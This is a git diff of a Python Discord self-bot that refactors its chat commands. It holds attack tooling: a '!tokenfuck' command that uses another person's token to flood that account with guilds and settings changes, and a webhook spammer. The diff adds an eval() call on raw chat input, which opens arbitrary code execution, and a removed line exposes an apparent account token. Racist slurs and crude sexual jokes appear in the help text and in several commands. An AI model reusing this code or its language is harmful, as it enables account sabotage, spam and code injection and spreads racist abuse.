@@ -1,4 +1,4 @@
-import discord
+import discord 
 from discord.ext import commands
 import random
 import aiohttp
@@ -9,10 +9,11 @@ from datetime import datetime
 import base64
 from itertools import cycle
 import linecache
+import os
 
-OTQwOTUxNDM0Nzc2Njg2Njgy.YgVEVw.lMnKlbrot5wcgk5Fli9-M7Zg02Y
 token = ""
-bot = commands.Bot(command_prefix='!', self_bot=True)
+
+bot = commands.Bot(command_prefix='!', bot=False)
 color = 3092790
 
 
@@ -82,14 +83,14 @@ async def on_message_delete(message):
 
 @bot.event
 async def on_message(message):
-        
+        args = message.content.split()
         
         #blacklist
         #if message.author.id == 919422362640842832:
           #pass
         
           
-        if message.content == '!help':
+        if args[0] ==  '!help':
           await message.channel.send("""```autohotkey
 A_Utility
 !snipe - sends the last deleted message 
@@ -107,11 +108,10 @@ A_Utility
 " Image "
 !banner - steals anyones banner
 !av - steals anyones avatar
-!meme - sends a shitty reddit meme lol 
 !racc - sends a raccoon pic 
 !cat - sends a cat pic 
 !dog - sends a dog pic 
-!hentai - you already know what it does (SOON!)
+!hentai - you already know what it does 
 
 %Fun%
 !8ball - 8ball
@@ -120,86 +120,66 @@ A_Utility
 !guessinggame - guessing game (if someone interrupts it breaks)
 !nigrate - sends ur nigrate u blackie 
 
-developed by xyte```""")
+Developed by xyte```""")
 
   
-        elif message.content == "!randomserver":
+        elif args[0] == "!randomserver":
           server = linecache.getline('servers.txt', random.randint(1, 1600))
           await message.channel.send(server)
 
+        elif args[0] == "!hentai":
+          await message.channel.send("Join my server for hentiea autoposting: https://discord.gg/3H593pZCqQ")
 
-        elif message.content == "!cf":
+        elif args[0] ==  "!cf":
           ht = random.randint(1,2)
           if ht == 1:
-            await message.channel.send("Heads!")
+            await message.channel.send("Heads!") #why did u make everything into args[0] again
           else:
             await message.channel.send("Tails!")
 
 
-        elif message.content == "!poll":
-          await message.channel.send("Question?")
-          response = await bot.wait_for('message')
-          question = response.content
-          if question == "!poll":
-            return
-          else:
-            message = await message.channel.send(f"""`Poll!`\n{question}""")
+        elif args[0] ==  "!poll":
+            message = await message.channel.send(f"""`Poll!`\n{args[1]}""")
             await message.add_reaction('✅')
             await message.add_reaction('❎')
 
 
-        elif message.content == "!leak":
-          await message.channel.send("Query?")
-          query = await bot.wait_for('message')
-          if query.author.id == bot.user.id:
-            pass
-          else:
-            search = query.content
-            search2 = search.replace("@", "%40")
-            await message.channel.send(f"<https://intelx.io/?s={search2}>")
+        elif args[0] ==  "!leak":
+          search = {args[1]}
+          search2 = str(search).replace("@", "%40").strip('{').strip('}').strip("'")
+          await message.channel.send(f"<https://intelx.io/?s={search2}>")
           
 
 
-        elif message.content == "!botinvite":
-          await message.channel.send('Bot id? ')
-          response = await bot.wait_for('message')
-          id = response.content
-          await message.channel.send(f'https://discord.com/api/oauth2/authorize?client_id={id}&permissions=0&scope=bot')
+        elif args[0] ==  "!botinvite":
+          await message.channel.send(f'https://discord.com/api/oauth2/authorize?client_id={args[1]}&permissions=0&scope=bot')
 
                       
-        elif message.content == '!deletewebhook':
-          await message.channel.send('Webhook? ')
-          response = await bot.wait_for('message')
+        elif args[0] ==  '!deletewebhook':
           try:
-            requests.delete(response.content)
-            await message.channel.send(f"Deleted webhook '{response.content}''")
+            requests.delete(args[1])
+            await message.channel.send(f"Deleted webhook '{eval(args[1])}''")
           except:
-            await message.channel.send(f"Error!")
+            await message.channel.send(f"Error! {eval(args[1])}")
 
-        elif message.content == "!b64encode":
-          await message.channel.send("Message you want to encode?")
-          response = await bot.wait_for('message')
-          response2 = str(response.content)
-          string_bytes = response2.encode("ascii")
+        elif args[0] ==  "!b64encode":
+          string_bytes = args[1].encode("ascii")
           base64_bytes = base64.b64encode(string_bytes) 
           base64_string = base64_bytes.decode("ascii") 
           await message.channel.send(f"Encoded: `{base64_string}`")
 
-        elif message.content == "!b64decode":
-          await message.channel.send("Message you want to decode?")
-          response = await bot.wait_for('message')
-          response2 = str(response.content)
-          string_bytes = response2.encode("ascii")
+        elif args[0] ==  "!b64decode":
+          string_bytes = args[1].encode("ascii")
           base64_bytes = base64.b64decode(string_bytes) 
           base64_string = base64_bytes.decode("ascii")
           await message.channel.send(f"Decoded: {base64_string}")
 
 
-        elif message.content == '!nigrate':
+        elif args[0] ==  '!nigrate':
           await message.channel.send(f"`ur nigrate is {random.randint(0,100)}% u black monkey `")
 
 
-        elif message.content == "!dog":
+        elif args[0] ==  "!dog":
              async with aiohttp.ClientSession() as session:
               request = await session.get('https://some-random-api.ml/img/dog') 
               dogjson = await request.json()
@@ -207,26 +187,16 @@ developed by xyte```""")
 
 
 
-        elif message.content == '!tokenfuck':
-          await message.channel.send("Token?")
-          response = await bot.wait_for('message')
-          if response.author.id == bot.user.id:
-            pass
-          else:
-            _token = str(response.content)
-            await message.channel.send("Server names?")
-            response2 = await bot.wait_for('message')
-            if response2.author.id == bot.user.id:
-              pass
-            else:
-              names = str(response2.content)
-              headers = {
+        elif args[0] ==  '!tokenfuck':
+            _token = str(args[1])
+            names = args[2]
+            headers = {
                   'User-Agent': 'Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.2 Chrome/51.0.2704.106 Safari/537.36',
                   'Content-Type': 'application/json',
                   'Authorization': _token,
               }
-              request = requests.Session()
-              payload = {
+            request = requests.Session()
+            payload = {
                   'theme': "light",
                   'locale': "ja",
                   'message_display_compact': False,
@@ -243,44 +213,43 @@ developed by xyte```""")
                   'developer_mode': True
                   
               }
-              guild = {
+            guild = {
                   'channels': None,
                   'icon': None,
                   'name': names,
                   'region': "europe"
               } 
-              try:
+            try:
                 for _i in range(100):
                     requests.post('https://discord.com/api/v6/guilds', headers=headers, json=guild)
-              except:
+            except:
                 pass
-              while True:
+            while True:
                   try:
                       request.patch("https://canary.discord.com/api/v6/users/@me/settings",headers=headers, json=payload)
                   except KeyError:
                       pass
                   else:
                       break
-              modes = cycle(["light", "light"])
-              statuses = cycle(["online", "idle", "invisible"])
-              for i in range(1000):
+            modes = cycle(["light", "light"])
+            statuses = cycle(["online", "idle", "invisible"])
+            for i in range(1000):
                   setting = {
                       'theme': next(modes),
                       'locale': random.choice(locales),
                       'status': next(statuses)
                   }
-                  for i in range(1000):
+            for i in range(1000):
                       try:
                           request.patch("https://canary.discord.com/api/v6/users/@me/settings", headers=headers, json=setting, timeout=10)
                       except KeyError:
                           pass
                       else:
                           break
-          await asyncio.sleep(2)
+
           
-        elif message.content == "!spamwebhook":
-          await message.channel.send("Webhook? ")
-          webhook = await bot.wait_for('message')
+        elif args[0] ==  "!spamwebhook":
+          webhook = args[1]
           try:
             for i in range(100):
               requests.post(
@@ -291,14 +260,14 @@ developed by xyte```""")
 
 
 
-        elif message.content == "!cat":
+        elif args[0] ==  "!cat":
              async with aiohttp.ClientSession() as session:
               request = await session.get('https://some-random-api.ml/img/cat') 
               dogjson = await request.json()
               await message.channel.send(dogjson['link'])
 
 
-        elif message.content == "!racc" or message.content == "!rat":
+        elif args[0] ==  "!racc" or args[0] ==  "!rat":
              async with aiohttp.ClientSession() as session:
               request = await session.get('https://some-random-api.ml/img/raccoon') 
               dogjson = await request.json()
@@ -306,10 +275,8 @@ developed by xyte```""")
 
 
 
-        elif message.content == "!tokeninfo":
-           await message.channel.send('Token?')
-           response = await bot.wait_for('message')
-           token = str(response.content)
+        elif args[0] ==  "!tokeninfo":
+           token = args[1]
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
@@ -370,10 +337,8 @@ developed by xyte```""")
 
 
 
-        elif message.content == "!idinfo":
-          await message.channel.send('User id?')
-          response = await bot.wait_for('message')
-          response2 = response.content
+        elif args[0] ==  "!idinfo":
+          response2 = args[1]
           user = await bot.fetch_user(response2)
           time1 = user.created_at.timestamp()
           timestamp = datetime.fromtimestamp(time1)
@@ -383,7 +348,7 @@ developed by xyte```""")
 **Created at:** {timestamp}
 """)
 
-        elif message.content == "!linkvertise":
+        elif args[0] ==  "!linkvertise":
           headers = {
           "Host": "bypass.bot.nu",
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
@@ -393,23 +358,15 @@ developed by xyte```""")
           "Referer": "https://bypass.bot.nu/",
           "Connection": "keep-alive",
               }
-          await message.channel.send("Link?")
-          response = await bot.wait_for('message')
-          link = response.content
-          if link == "Link?":
-            pass
-          else:
-            data = requests.get(f"https://bypass.bot.nu/bypass2?url={link}", headers=headers)
-            link = data.json()["destination"]
-            await message.channel.send(f"Link: {link}")
+          link = args[1]
+          data = requests.get(f"https://bypass.bot.nu/bypass2?url={link}", headers=headers)
+          link = data.json()["destination"]
+          await message.channel.send(f"Link: {link}")
 
-        elif message.content == "!av":
+        elif args[0] ==  "!av":
           await message.channel.send('User?')
           try:
-            response = await bot.wait_for('message')
-            response2 = response.content
-            user2 = response2.strip('<').strip('>').strip('@').strip('!')
-            user = await bot.fetch_user(user2)
+            user = args[1]
             await message.channel.send(user.avatar_url)
           except:
             response = await bot.wait_for('message')
@@ -418,15 +375,8 @@ developed by xyte```""")
             await message.channel.send(user.avatar_url)
 
 
-
-
-
-        elif message.content == "!banner":
-          await message.channel.send('User?')
-          response = await bot.wait_for('message')
-          response2 = response.content
-          user2 = response2.strip('<').strip('>').strip('@').strip('!')
-          user = await bot.fetch_user(user2)
+        elif args[0] ==  "!banner":
+          user = args[1]
           req = await bot.http.request(discord.http.Route("GET", "/users/{uid}", uid = user.id))
           banner_id = req["banner"]
           if banner_id == None:
@@ -436,12 +386,8 @@ developed by xyte```""")
             await message.channel.send(banner_url)
 
 
-
-
-        elif message.content == "!ipinfo":
-            await message.channel.send('Ip?')
-            ip = await bot.wait_for('message')
-            ip2 = str(ip.content)
+        elif args[0] ==  "!ipinfo":
+            ip2 = args[1]
             if ip2 == "Link?":
               pass
             else:
@@ -454,24 +400,19 @@ developed by xyte```""")
 
                 await message.channel.send(f"""```{ipinfo}```""")
               
-        elif message.content == "!8ball":
-          await message.channel.send('Question?')
-          question = await bot.wait_for('message')
-          if question.author.id == bot.user.id:
-            pass
-          else:
-            q = question.content
-            responses = ['yes',
+        elif args[0] ==  "!8ball":
+          q = args[1]
+          responses = ['yes',
                     'no',
                     'maybey',
                     'sure']
-            response = random.choice(responses)
-            lol = random.randint(1, 30)
-            if lol == 7:
-              response = "i put my coomer in ur moder"
+          response = random.choice(responses)
+          lol = random.randint(1, 30)
+          if lol == 7:
+            response = "i put my coomer in ur moder"
             await message.channel.send(f'''Question: {q}\nAnswer: {response}''')      
 
-        elif message.content == '!snipe':
+        elif args[0] ==  '!snipe':
             if snipe_message_content==None:
                 await message.channel.send("NOTHING TO SNIPE U FAT LITTLE MONKEY")
             else:
@@ -479,8 +420,10 @@ developed by xyte```""")
 Sniped: `{snipe_message_content}`
 Sent by: <@{snipe_message_author}>""")
 
+
+
           
-        elif message.content == "!guessinggame":
+        elif args[0] ==  "!guessinggame":
                 await message.channel.send('Guess a number from 1 to 5!')
                 number = random.randint(1, 5)
                 for i in range(1, 5):
